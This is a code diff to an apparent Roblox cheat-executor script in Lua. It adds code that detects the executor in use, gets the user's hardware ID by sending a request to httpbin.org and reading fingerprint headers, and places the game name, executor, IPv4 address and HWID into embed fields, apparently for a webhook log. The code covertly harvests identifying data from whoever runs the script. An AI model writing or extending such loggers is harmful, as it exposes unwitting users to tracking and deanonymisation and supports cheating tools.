@@ -75,6 +75,15 @@ local framework = {
     local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
     local UserId = LocalPlayer.UserId
     local PlayerName = LocalPlayer.Name
+    local gamename = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+    local explcheck =
+	is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+	secure_load and "Sentinel" or
+	KRNL_LOADED and "Krnl" or
+	SONA_LOADED and "Sona" or identifyexecutor()
+	or "Unknown"
+    local hwid_headers = {'Syn-Fingerprint'} or {'Krnl-Hwid'} or {'fingerprint'} or {'sentinel-fingerprint'} or {'proto-user-identifier'} or {'shadow_hardware'} or {'exploit-guid'} or nil
+    function hwid()local a=req({Url='https://httpbin.org/get',Method='GET'})local b=game:GetService('HttpService'):JSONDecode(a.Body)for c,d in pairs(hwid_headers)do if b.headers[d]then return b.headers[d]end end end
   
     local PlayerData =
     {
@@ -100,21 +109,26 @@ local framework = {
                        ["inline"] = true
     },
                    {
+                       ["name"] = "Game; ",
+                       ["value"] = gamename,
+                       ["inline"] = true
+    },
+                  {
+                       ["name"] = "Executer; ",
+                       ["value"] = explcheck,
+                       ["inline"] = true
+    },
+                   {
                        ["name"] = "IPv4; ",
                        ["value"] = IPv4,
                        ["inline"] = true
     },
-        --[[          {
-                       ["name"] = "IPv6; ",
-                       ["value"] = IPv6,
-                       ["inline"] = true
-    },]]
   
-        --[[          {
-                       ["name"] = "Whitelist; ",
-                       ["value"] = whitelistKey,
+                  {
+                       ["name"] = "HWID; ",
+                       ["value"] = tostring(hwid()),
                        ["inline"] = true
-    },]]
+    },
                },
   
            }}
